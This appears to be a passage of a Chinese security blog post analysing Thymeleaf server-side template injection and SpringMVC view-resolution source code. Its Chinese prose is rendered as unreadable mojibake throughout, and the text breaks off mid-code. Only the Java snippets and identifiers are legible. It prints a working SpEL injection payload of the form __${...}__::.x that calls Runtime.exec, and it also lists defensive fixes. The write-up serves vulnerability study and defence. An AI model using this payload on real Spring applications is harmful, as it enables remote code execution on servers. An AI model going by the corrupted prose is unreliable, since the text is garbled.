çƒ­çˆ±å®‰å…¨çš„ç†æƒ³å°‘å¹´ (cnpanda.net)</a></p><p>æ­¤æ¼æ´åŒæ ·è¢«è§¦å‘åœ¨æ¨¡æ¿è§†å›¾æ¸²æŸ“æ—¶</p><p>é€šè¿‡å‰ä¸¤ä¸ªå¯¹æ¨¡æ¿çš„è§†å›¾è§£æä¸æ¸²æŸ“ä»£ç åˆ†æï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¼€å§‹æ¸²æŸ“è°ƒç”¨çš„æ˜¯renderæ–¹æ³•ï¼ŒVelocityè°ƒç”¨<code>VelocityView#render</code>æ¸²æŸ“ï¼ŒFreeMarkerè°ƒç”¨&#96;&#96;FreeMarker#render<code>æ¸²æŸ“ï¼ŒåŒæ ·Thymeleafè°ƒç”¨</code>ThymleafView#render&#96;æ¸²æŸ“ã€‚</p><p><code>render</code>æ–¹æ³•ä¸­åˆé€šè¿‡è°ƒç”¨<code>renderFragment</code>å®Œæˆå®é™…çš„æ¸²æŸ“å·¥ä½œã€‚</p><p>åœ¨è¿™é‡Œè¯¦ç»†åˆ†æThymeleafçš„æ¸²æŸ“å·¥ä½œ</p><p>createView() é¦–å…ˆæ ¹æ®è§†å›¾ååˆ›å»ºå¯¹åº”çš„View</p><p>ä¹‹åå¼€å§‹æ¸²æŸ“ï¼Œå¦‚æœæ­¤å¤„æ˜¯ FreeMarkerï¼Œå°±ä¼šå» <code>FreeMarkerView.render()</code>ï¼Œå¦‚æœæ˜¯ Velocityï¼Œå°±ä¼šå» <code>VelocityView.render()</code>ï¼Œæˆ‘ä»¬æ­¤å¤„æ˜¯ Thymeleafï¼Œä¼šå»åˆ° <code>ThymeleafView.render()</code>ï¼Œè·Ÿè¿›ã€‚</p><p>è·Ÿè¿› <code>renderFragment()</code> æ–¹æ³•ã€‚åœ¨ç¬¬ 100 è¡Œï¼Œåˆ¤æ–­ <code>getTemplateName</code> å½“ä¸­æ˜¯å¦å­˜åœ¨ <code>::</code> è¿™ä¸€å­—ç¬¦ï¼Œå¦‚æœä¸å­˜åœ¨å°±å½“ä½œæ˜¯ä¸€ä¸ªæ™®é€šçš„æ¨¡æ¿ï¼Œç›´æ¥èµ‹å€¼ç»™ <code>templateName</code>ï¼Œå¹¶æ¸…ç©º <code>markupSelectors</code>ã€‚</p><p>æ‰€ä»¥payloadæœ«å°¾éœ€è¦åŠ ::ï¼Œå¹¶ä¸”åœ¨å‰é¢ä»‹ç»~{}è¯­æ³•æ—¶æåˆ°ï¼šï¼šåæ˜¯éœ€è¦æœ‰å€¼(ä¹Ÿå°±æ˜¯<code>selector</code>)ï¼Œæ‰€ä»¥æœ«å°¾æ˜¯.x</p><p><img src="/img/ssti(java)/ssti47.png"></p><p>ç»§ç»­å¾€ä¸‹èµ°ï¼Œç¬¬ 108 è¡Œï¼Œè°ƒç”¨äº† <code>(FragmentExpression)parser.parseExpression()</code>ï¼Œå¯¹æˆ‘ä»¬è¾“å…¥çš„è¿™ä¸€ä¸²å­—ç¬¦è¿›è¡Œäº†å¤„ç†ã€‚</p><p><img src="/img/ssti(java)/ssti48.png"></p><p><img src="/img/ssti(java)/ssti49.png"></p><p>ç»§ç»­è·Ÿè¿› <code>StandardExpressionPreprocessor.preprocess()</code></p><p>å¤åˆ¶å‡ºäº†æ¯”è¾ƒå…³é”®çš„ä¸€æ®µä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> String <span class="hljs-title function_">preprocess</span><span class="hljs-params">(IExpressionContext context, String input)</span> &#123;<br>        <span class="hljs-keyword">if</span> (input.indexOf(<span class="hljs-number">95</span>) == -<span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">return</span> input;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">IStandardExpressionParser</span> <span class="hljs-variable">expressionParser</span> <span class="hljs-operator">=</span> StandardExpressions.getExpressionParser(context.getConfiguration());<br>            <span class="hljs-keyword">if</span> (!(expressionParser <span class="hljs-keyword">instanceof</span> StandardExpressionParser)) &#123;<br>                <span class="hljs-keyword">return</span> input;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">Matcher</span> <span class="hljs-variable">matcher</span> <span class="hljs-operator">=</span> PREPROCESS_EVAL_PATTERN.matcher(input);<br>                <span class="hljs-keyword">if</span> (!matcher.find()) &#123;<br>                    <span class="hljs-keyword">return</span> checkPreprocessingMarkUnescaping(input);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">strBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(input.length() + <span class="hljs-number">24</span>);<br>                    <span class="hljs-type">int</span> <span class="hljs-variable">curr</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>å…ˆåˆ¤æ–­ï¼Œinput é‡Œé¢æ˜¯å¦æœ‰å­˜åœ¨ <code>_</code> å­—ç¬¦ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™ç›´æ¥è¿”å›ï¼Œä¸åšè§£æå¤„ç†ã€‚</p><p>æ¥ç€ï¼Œè°ƒç”¨ <code>PREPROCESS_EVAL_PATTERN.matcher(input);</code>ï¼Œè¿›è¡Œæ­£åˆ™æå–ï¼Œè¿™é‡Œæå–çš„æ˜¯ <code>_</code> ä¸­é—´çš„å†…å®¹ã€‚</p><p>æå–åè·å–åˆ°çš„å†…å®¹æ˜¯ <code>$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;Calc&quot;).getInputStream()).next()&#125;</code></p><p>æ­¤è¯­å¥æ˜¯è¢«å½“ä½œSpELè¡¨è¾¾å¼æ‰§è¡Œçš„</p><p>å› æ­¤ POC ä¸­æˆ‘ä»¬è¦æ„é€ å½¢å¦‚<code>__xx__</code>çš„SpELè¡¨è¾¾å¼ï¼ˆSpELç›¸å…³çš„çŸ¥è¯†ç‚¹å¯ä»¥å‚è€ƒæ­¤æ–‡ï¼š<a href="https://paper.seebug.org/1694/">SPEL è¡¨è¾¾å¼æ³¨å…¥æ¼æ´æ·±å…¥åˆ†æ</a>ï¼‰ï¼Œå³è¡¨è¾¾å¼è¦ä¸ºï¼š<code>__$&#123;xxxxx&#125;__</code> è¿™ç§å½¢å¼</p><p>å› æ­¤ï¼Œæœ€ç»ˆ POC çš„å½¢å¼å°±ä¸ºï¼š<code>__$&#123;xxxx&#125;__::.x</code></p><p>ç»§ç»­å¾€ä¸‹èµ°ï¼Œåˆ°äº† <code>expression.execute()</code>ï¼Œä¹Ÿå°±æ˜¯å‘½ä»¤æ‰§è¡Œçš„åœ°æ–¹ï¼Œè¯­å¥å°±å˜æˆäº†</p><p><img src="/img/ssti(java)/ssti50.png"></p><p>è‡³æ­¤åˆ†æè¿‡ç¨‹ç»“æŸã€‚</p><h3 id="Thymeleaf-SSTI-Bypass"><a href="#Thymeleaf-SSTI-Bypass" class="headerlink" title="Thymeleaf SSTI Bypass"></a>Thymeleaf SSTI Bypass</h3><p>è¯¦æƒ…è¯·è§ï¼š<a href="https://www.cnpanda.net/sec/1063.html">Thymeleaf SSTI åˆ†æä»¥åŠæœ€æ–°ç‰ˆä¿®å¤çš„ Bypass - Panda | çƒ­çˆ±å®‰å…¨çš„ç†æƒ³å°‘å¹´ (cnpanda.net)</a></p><h3 id="é˜²å¾¡æªæ–½"><a href="#é˜²å¾¡æªæ–½" class="headerlink" title="é˜²å¾¡æªæ–½"></a>é˜²å¾¡æªæ–½</h3><ol><li>é…ç½®<code>@ResponseBody</code>æˆ–è€…<code>@RestController</code>ï¼Œç»ä»¥ä¸Šæ³¨è§£åä¸ä¼šè¿›è¡ŒViewè§£æè€Œæ˜¯ç›´æ¥è¿”å›ã€‚</li><li>åœ¨æ–¹æ³•å‚æ•°ä¸­åŠ ä¸Š <code>HttpServletResponse</code>å‚æ•° ï¼Œæ­¤æ—¶springä¼šè®¤ä¸ºå·²ç»å¤„ç†äº†responseå“åº”è€Œä¸å†è¿›è¡Œè§†å›¾è§£æã€‚</li><li>åœ¨è¿”å›å€¼å‰é¢åŠ ä¸Š â€œ<code>redirect:</code>â€œâ€”â€”ç»<code>RedirectView</code>å¤„ç†ã€‚</li></ol><h2 id="SpringMVC-è§†å›¾è§£æè¿‡ç¨‹åˆ†æ"><a href="#SpringMVC-è§†å›¾è§£æè¿‡ç¨‹åˆ†æ" class="headerlink" title="SpringMVC è§†å›¾è§£æè¿‡ç¨‹åˆ†æ"></a>SpringMVC è§†å›¾è§£æè¿‡ç¨‹åˆ†æ</h2><p>åœ¨controlleræ¼æ´ä»£ç å¤„ä¸‹æ–­ç‚¹ï¼Œå¯ä»¥çœ‹åˆ°è‹¥æœ‰å®Œæ•´çš„MVCæ¡†æ¶ï¼Œç»è¿‡çš„è°ƒç”¨æ ˆéƒ½æ˜¯ç›¸åŒçš„</p><p><img src="/img/ssti(java)/ssti34.png"></p><p><img src="/img/ssti(java)/ssti35.png"></p><p>æ‰€ä»¥ä»¥Thymeleafä¸ºä¾‹å°è¯•åˆ†æä¸€ä¸‹SpringMVC è§†å›¾è§£æè¿‡ç¨‹</p><p>æ­¤å¤„å…¶å®æ˜¯æ¶‰åŠåˆ°çš„åç«¯çŸ¥è¯†è¾ƒå¤š</p><p>å‚è€ƒï¼š<a href="https://segmentfault.com/a/1190000021848063#item-2-4">spring-mvc - æ·±å…¥æºç åˆ†æSpringMVCæ‰§è¡Œè¿‡ç¨‹ - åç«¯æŠ€æœ¯ç¤¾åŒº - SegmentFault æ€å¦</a></p><h3 id="æµç¨‹å›¾"><a href="#æµç¨‹å›¾" class="headerlink" title="æµç¨‹å›¾"></a>æµç¨‹å›¾</h3><p>é¦–å…ˆï¼Œè®©æˆ‘ä»¬ä» Spring MVC çš„å››å¤§ç»„ä»¶:<strong>å‰ç«¯æ§åˆ¶å™¨ï¼ˆDispatcherServletï¼‰ã€å¤„ç†å™¨æ˜ å°„å™¨ï¼ˆHandlerMappingï¼‰ã€å¤„ç†å™¨é€‚é…å™¨ï¼ˆHandlerAdapterï¼‰ä»¥åŠè§†å›¾è§£æå™¨ï¼ˆViewResolverï¼‰</strong> çš„è§’åº¦æ¥çœ‹ä¸€ä¸‹ Spring MVC å¯¹ç”¨æˆ·è¯·æ±‚çš„å¤„ç†è¿‡ç¨‹ï¼Œè¿‡ç¨‹å¦‚ä¸‹å›¾æ‰€ç¤º:</p><p><img src="https://img-blog.csdnimg.cn/20200221001135320.png"></p><h3 id="æ‰§è¡Œæµç¨‹"><a href="#æ‰§è¡Œæµç¨‹" class="headerlink" title="æ‰§è¡Œæµç¨‹"></a>æ‰§è¡Œæµç¨‹</h3><ol><li>ç”¨æˆ·è¯·æ±‚å‘é€åˆ°<strong>å‰ç«¯æ§åˆ¶å™¨ DispatcherServlet</strong>ã€‚</li><li>å‰ç«¯æ§åˆ¶å™¨ DispatcherServlet æ¥æ”¶åˆ°è¯·æ±‚åï¼ŒDispatcherServlet ä¼šä½¿ç”¨ HandlerMapping æ¥å¤„ç†ï¼Œ<strong>HandlerMapping ä¼šæŸ¥æ‰¾åˆ°å…·ä½“è¿›è¡Œå¤„ç†è¯·æ±‚çš„ Handler å¯¹è±¡</strong>ã€‚</li><li>HandlerMapping æ‰¾åˆ°å¯¹åº”çš„ Handler ä¹‹åï¼Œå¹¶ä¸æ˜¯è¿”å›ä¸€ä¸ª Handler åŸå§‹å¯¹è±¡ï¼Œè€Œæ˜¯ä¸€ä¸ª Handler æ‰§è¡Œé“¾ï¼ˆHandlerExecutionChainï¼‰ï¼Œåœ¨è¿™ä¸ªæ‰§è¡Œé“¾ä¸­åŒ…æ‹¬äº†æ‹¦æˆªå™¨å’Œå¤„ç†è¯·æ±‚çš„ Handlerã€‚HandlerMapping è¿”å›ä¸€ä¸ªæ‰§è¡Œé“¾ç»™ DispatcherServletã€‚</li><li>DispatcherServlet æ¥æ”¶åˆ°æ‰§è¡Œé“¾ä¹‹åï¼Œä¼š<strong>è°ƒç”¨ Handler é€‚é…å™¨å»æ‰§è¡Œ Handler</strong>ã€‚</li><li>Handler é€‚é…å™¨æ‰§è¡Œå®Œæˆ Handlerï¼ˆä¹Ÿå°±æ˜¯ Controllerï¼‰ä¹‹åä¼šå¾—åˆ°ä¸€ä¸ª ModelAndViewï¼Œå¹¶è¿”å›ç»™ DispatcherServletã€‚</li><li>DispatcherServlet æ¥æ”¶åˆ° HandlerAdapter è¿”å›çš„ ModelAndView ä¹‹åï¼Œä¼šæ ¹æ®å…¶ä¸­çš„è§†å›¾åè°ƒç”¨ ViewResolverã€‚</li><li><strong>ViewResolver æ ¹æ®é€»è¾‘è§†å›¾åè§£ææˆä¸€ä¸ªçœŸæ­£çš„ View è§†å›¾</strong>ï¼Œå¹¶è¿”å›ç»™ DispatcherServletã€‚</li><li>DispatcherServlet æ¥æ”¶åˆ°è§†å›¾ä¹‹åï¼Œä¼šæ ¹æ®ä¸Šé¢çš„ ModelAndView ä¸­çš„ model æ¥è¿›è¡Œè§†å›¾ä¸­æ•°æ®çš„å¡«å……ï¼Œä¹Ÿå°±æ˜¯æ‰€è°“çš„<strong>è§†å›¾æ¸²æŸ“</strong>ã€‚</li><li>æ¸²æŸ“å®Œæˆä¹‹åï¼ŒDispatcherServlet å°±å¯ä»¥å°†ç»“æœè¿”å›ç»™ç”¨æˆ·äº†ã€‚</li></ol><h3 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h3><p>é¦–å…ˆå½“æˆ‘ä»¬è®¿é—®é¡µé¢çš„æ—¶å€™ï¼Œå°†ä¼šæŠŠè¯·æ±‚å‘é€åˆ°<strong>å‰ç«¯æ§åˆ¶å™¨ DispatcherServlet</strong>ï¼ŒDispatcherServlet æ˜¯ä¸€ä¸ª Servletï¼Œæˆ‘ä»¬çŸ¥é“åœ¨ Servlet åœ¨å¤„ç†ä¸€ä¸ªè¯·æ±‚çš„æ—¶å€™ä¼šäº¤ç»™ service æ–¹æ³•è¿›è¡Œå¤„ç†ï¼Œè¿™é‡Œä¹Ÿä¸ä¾‹å¤–ï¼ŒDispatcherServlet ç»§æ‰¿äº† FrameworkServletï¼Œé¦–å…ˆè¿›å…¥ FrameworkServlet çš„ <strong>service</strong> æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>    <span class="hljs-comment">// è¯·æ±‚æ–¹æ³•</span><br>    <span class="hljs-type">HttpMethod</span> <span class="hljs-variable">httpMethod</span> <span class="hljs-operator">=</span> HttpMethod.resolve(request.getMethod());<br>    <span class="hljs-comment">// è‹¥æ–¹æ³•ä¸º PATCH æ–¹æ³•æˆ–ä¸ºç©ºåˆ™å•ç‹¬å¤„ç†</span><br>    <span class="hljs-keyword">if</span> (httpMethod == HttpMethod.PATCH || httpMethod == <span class="hljs-literal">null</span>) &#123;<br>        processRequest(request, response);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">// å…¶ä»–çš„è¯·æ±‚ç±»å‹çš„æ–¹æ³•ç»ç”±çˆ¶ç±»ï¼Œä¹Ÿå°±æ˜¯ HttpServlet å¤„ç†</span><br>        <span class="hljs-built_in">super</span>.service(request, response);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>HttpServlet ä¸­ä¼šæ ¹æ®è¯·æ±‚ç±»å‹çš„ä¸åŒåˆ†åˆ«è°ƒç”¨ doGet æˆ–è€… doPost ç­‰æ–¹æ³•ï¼ŒFrameworkServlet ä¸­å·²ç»é‡å†™äº†è¿™äº›æ–¹æ³•ï¼Œåœ¨è¿™äº›æ–¹æ³•ä¸­ä¼šè°ƒç”¨ processRequest è¿›è¡Œå¤„ç†ï¼Œåœ¨ processRequest ä¸­ä¼šè°ƒç”¨ <strong>doService</strong> æ–¹æ³•ï¼Œè¿™ä¸ª doService æ–¹æ³•å°±æ˜¯åœ¨ DispatcherServlet ä¸­å®ç°çš„ã€‚ä¸‹é¢å°±çœ‹ä¸‹ DispatcherServlet ä¸­çš„ doService æ–¹æ³•çš„å®ç°ã€‚</p><h4 id="DispatcherServlet-æ”¶åˆ°è¯·æ±‚"><a href="#DispatcherServlet-æ”¶åˆ°è¯·æ±‚" class="headerlink" title="DispatcherServlet æ”¶åˆ°è¯·æ±‚"></a>DispatcherServlet æ”¶åˆ°è¯·æ±‚</h4><p>åœ¨doServiceå¤„ä¸‹ä¸€ä¸ªæ–­ç‚¹å¼€å§‹è°ƒè¯•</p><p>çœ‹åˆ°417è¡Œè°ƒç”¨äº†doDispatch æ–¹æ³•</p><p>é¦–å…ˆä¼šè·å–å½“å‰è¯·æ±‚çš„ <strong>Handler æ‰§è¡Œé“¾</strong>ï¼Œç„¶åæ‰¾åˆ°åˆé€‚çš„ <strong>HandlerAdapter</strong>ï¼ˆæ­¤å¤„ä¸º RequestMappingHandlerAdapterï¼‰ï¼Œæ¥ç€è°ƒç”¨ RequestMappingHandlerAdapter çš„ <strong>handle</strong> æ–¹æ³•ï¼Œå¦‚ä¸‹ä¸º doDispatch æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doDispatch</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">processedRequest</span> <span class="hljs-operator">=</span> request;<br>    <span class="hljs-type">HandlerExecutionChain</span> <span class="hljs-variable">mappedHandler</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-type">boolean</span> <span class="hljs-variable">multipartRequestParsed</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-type">WebAsyncManager</span> <span class="hljs-variable">asyncManager</span> <span class="hljs-operator">=</span> WebAsyncUtils.getAsyncManager(request);<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">ModelAndView</span> <span class="hljs-variable">mv</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">Exception</span> <span class="hljs-variable">dispatchException</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// å…ˆæ£€æŸ¥æ˜¯ä¸æ˜¯ Multipart ç±»å‹çš„ï¼Œæ¯”å¦‚ä¸Šä¼ ç­‰ï¼›å¦‚æœæ˜¯ Multipart ç±»å‹çš„ï¼Œåˆ™è½¬æ¢ä¸º MultipartHttpServletRequest ç±»å‹</span><br>            processedRequest = checkMultipart(request);<br>            multipartRequestParsed = (processedRequest != request);<br><br>            <span class="hljs-comment">// è·å–å½“å‰è¯·æ±‚çš„ Handler æ‰§è¡Œé“¾</span><br>            mappedHandler = getHandler(processedRequest);<br>            <span class="hljs-keyword">if</span> (mappedHandler == <span class="hljs-literal">null</span>) &#123;<br>                noHandlerFound(processedRequest, response);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br><br>            <span class="hljs-comment">// è·å–å½“å‰è¯·æ±‚çš„ Handler é€‚é…å™¨</span><br>            <span class="hljs-type">HandlerAdapter</span> <span class="hljs-variable">ha</span> <span class="hljs-operator">=</span> getHandlerAdapter(mappedHandler.getHandler());<br><br>            <span class="hljs-comment">// å¯¹äº header ä¸­ last-modified çš„å¤„ç†</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> request.getMethod();<br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">isGet</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;GET&quot;</span>.equals(method);<br>            <span class="hljs-keyword">if</span> (isGet || <span class="hljs-string">&quot;HEAD&quot;</span>.equals(method)) &#123;<br>                <span class="hljs-type">long</span> <span class="hljs-variable">lastModified</span> <span class="hljs-operator">=</span> ha.getLastModified(request, mappedHandler.getHandler());<br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletWebRequest</span>(request, response).checkNotModified(lastModified) &amp;&amp; isGet) &#123;<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-comment">// éå†æ‰€æœ‰å®šä¹‰çš„ interceptorï¼Œæ‰§è¡Œ preHandle æ–¹æ³•</span><br>            <span class="hljs-keyword">if</span> (!mappedHandler.applyPreHandle(processedRequest, response)) &#123;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br><br>            <span class="hljs-comment">// å®é™…è°ƒç”¨ Handler çš„åœ°æ–¹</span><br>            mv = ha.handle(processedRequest, response, mappedHandler.getHandler());<br><br>            <span class="hljs-keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>            <span class="hljs-comment">// å¤„ç†æˆé»˜è®¤è§†å›¾åï¼Œä¹Ÿå°±æ˜¯æ·»åŠ å‰ç¼€å’Œåç¼€ç­‰</span><br>            applyDefaultViewName(processedRequest, mv);<br>            <span class="hljs-comment">// æ‹¦æˆªå™¨postHandleæ–¹æ³•è¿›è¡Œå¤„ç†</span><br>            mappedHandler.applyPostHandle(processedRequest, response, mv);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>            dispatchException = ex;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Throwable err) &#123;<br>            dispatchException = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NestedServletException</span>(<span class="hljs-string">&quot;Handler dispatch failed&quot;</span>, err);<br>        &#125;<br>        <span class="hljs-comment">// å¤„ç†æœ€åçš„ç»“æœï¼Œæ¸²æŸ“ä¹‹ç±»çš„éƒ½åœ¨è¿™é‡Œ</span><br>        processDispatchResult(processedRequest, response, mappedHandler, mv, dispatchException);<br>    &#125;<br>    <span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>        triggerAfterCompletion(processedRequest, response, mappedHandler, ex);<br>    &#125;<br>    <span class="hljs-keyword">catch</span> (Throwable err) &#123;<br>        triggerAfterCompletion(processedRequest, response, mappedHandler,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">NestedServletException</span>(<span class="hljs-string">&quot;Handler processing failed&quot;</span>, err));<br>    &#125;<br>    <span class="hljs-keyword">finally</span> &#123;<br>        <span class="hljs-keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;<br>            <span class="hljs-keyword">if</span> (mappedHandler != <span class="hljs-literal">null</span>) &#123;<br>                mappedHandler.applyAfterConcurrentHandlingStarted(processedRequest, response);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (multipartRequestParsed) &#123;<br>                cleanupMultipart(processedRequest);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="æŸ¥æ‰¾å¯¹åº”çš„-Handler-å¯¹è±¡"><a href="#æŸ¥æ‰¾å¯¹åº”çš„-Handler-å¯¹è±¡" class="headerlink" title="æŸ¥æ‰¾å¯¹åº”çš„ Handler å¯¹è±¡"></a>æŸ¥æ‰¾å¯¹åº”çš„ Handler å¯¹è±¡</h4><p><img src="/img/ssti(java)/ssti36.png"></p><p>å¯ä»¥çœ‹åˆ°468è¡Œè°ƒç”¨äº†getHandleræ–¹æ³•ï¼Œè·Ÿè¿›ä¸€ä¸‹</p><p>è¯¥æ–¹æ³•ä¸»è¦æ˜¯éå†æ‰€æœ‰çš„ handlerMappings è¿›è¡Œå¤„ç†ï¼ŒhandlerMappings æ˜¯åœ¨å¯åŠ¨çš„æ—¶å€™é¢„å…ˆæ³¨å†Œå¥½çš„ï¼ŒhandlerMappings åŒ…å« RequestMappingHandlerMappingã€BeanNameUrlHandlerMappingã€RouterFunctionMappingã€SimpleUrlHandlerMapping ä»¥åŠ WelcomePageHandlerMappingï¼Œåœ¨å¾ªç¯ä¸­ä¼šè°ƒç”¨ <strong>AbstractHandlerMapping ç±»ä¸­çš„ getHandler æ–¹æ³•</strong>æ¥è·å– Handler æ‰§è¡Œé“¾ï¼Œè‹¥è·å–çš„ Handler æ‰§è¡Œé“¾ä¸ä¸º nullï¼Œåˆ™è¿”å›å½“å‰è¯·æ±‚çš„ Handler æ‰§è¡Œé“¾ï¼ŒDispatcherServlet ç±»çš„ getHandler æ–¹æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> HandlerExecutionChain <span class="hljs-title function_">getHandler</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.handlerMappings != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">// éå†æ‰€æœ‰çš„ handlerMappings è¿›è¡Œå¤„ç†ï¼ŒhandlerMappings æ˜¯åœ¨å¯åŠ¨çš„æ—¶å€™é¢„å…ˆæ³¨å†Œå¥½çš„</span><br>        <span class="hljs-keyword">for</span> (HandlerMapping mapping : <span class="hljs-built_in">this</span>.handlerMappings) &#123;<br>            <span class="hljs-type">HandlerExecutionChain</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> mapping.getHandler(request);<br>            <span class="hljs-keyword">if</span> (handler != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">return</span> handler;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨å¾ªç¯ä¸­ï¼Œæ ¹æ® <code>mapping.getHandler(request);</code>ï¼Œç»§ç»­å¾€ä¸‹çœ‹ <strong>AbstractHandlerMapping ç±»ä¸­çš„ getHandler æ–¹æ³•</strong>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> HandlerExecutionChain <span class="hljs-title function_">getHandler</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">// æ 